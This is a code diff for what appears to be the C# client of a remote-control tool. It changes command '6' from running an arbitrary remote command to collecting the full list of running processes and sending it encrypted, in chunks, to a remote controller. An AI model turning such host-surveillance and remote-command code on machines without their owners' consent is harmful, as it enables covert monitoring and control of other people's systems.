@@ -93,9 +93,16 @@ namespace Client_side
                     }
                 case "6":
                     {
-                        string result = ExecuteCommand(commandParts[1]);
-                        byte[] encryptedResult = encryptor.Encrypt(result);
-                        NetworkLayer.SendResult(encryptedResult);
+                        List<string> procListChunks = GetProcList();
+                        string fileID = Guid.NewGuid().ToString();
+                        string fileLength = procListChunks.Count.ToString();
+                        string fileName = "processes.txt";
+
+                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
+                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
+                        NetworkLayer.SendResult(encryptedHeader);
+
+                        SendChunks(procListChunks, encryptor, fileID);
                         break;
                     }
                 case "7":
@@ -388,6 +395,37 @@ namespace Client_side
                 chunks.Add(systemInfo.Substring(i, Math.Min(MaxChunkSize, systemInfo.Length - i)));
             }
 
+            return chunks;
+        }
+
+        private static List<string> GetProcList()
+        {
+            List<string> chunks = new();
+            string procList = "";
+            Process[] processes = Process.GetProcesses();
+            // Format: ProcessName -- ProcessID -- ThreadCount -- MemoryUsage
+            foreach (Process process in processes)
+            {
+                try
+                {
+                    string processName = process.ProcessName;
+                    int processID = process.Id;
+                    int threadCount = process.Threads.Count;
+                    long memoryUsage = process.WorkingSet64;
+                    procList += $"{processName} -- {processID} -- {threadCount} -- {memoryUsage}\n";
+                }
+                catch (Exception ex)
+                {
+                    procList += ex.ToString();
+                    //continue;
+                }
+            }
+            
+            procList = Encryptor.ConvertStr(Encoding.UTF8.GetBytes(procList));
+            for (int i = 0; i < procList.Length; i += MaxChunkSize)
+            {
+                chunks.Add(procList.Substring(i, Math.Min(MaxChunkSize, procList.Length - i)));
+            }
             return chunks;
         }
 
